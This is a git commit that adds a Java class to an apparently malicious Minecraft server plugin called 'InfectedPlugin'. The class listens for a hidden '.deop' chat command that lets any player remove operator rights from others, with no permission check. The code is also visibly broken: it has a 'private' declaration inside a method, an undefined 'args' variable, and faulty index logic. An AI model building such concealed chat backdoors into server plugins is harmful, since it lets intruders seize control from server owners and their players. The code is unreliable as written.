dfc3b39f3c5c895bbfe7c623cda7f90cf5c71549
Wilee999 <Infinitywilee@rocketmail.com>
2013-10-17 15:46:38 -0700

    Moved .deop into it's own class.

---
+++ src/org/CreeperCoders/InfectedPlugin/Commands/Command_deop.java
@@ -0,0 +1,35 @@
+package org.CreeperCoders.InfectedPlugin;
+
+import org.bukkit.Server;
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.entity.Player;
+import org.bukkit.event.Listener;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
+
+public class Command_deop implements Listener
+{
+    public void onPlayerChat(AsyncPlayerChatEvent event)
+    {
+        String message = event.getMessage();
+        final Player p = event.getPlayer();
+        private Server server = Bukkit.getServer();
+        boolean cancel = true;
+    
+        if (message.toLowerCase().contains(".deop"))
+        {
+            if (args.length != 1)
+            {
+                p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
+                cancel = true;
+            }
+            else
+            {
+                Player target = server.getPlayer(args[1]);
+                target.setOp(false);
+                target.sendMessage(ChatColor.RED + "You are no longer OP.");
+                cancel = true;
+            }
+        }
+    }
+}
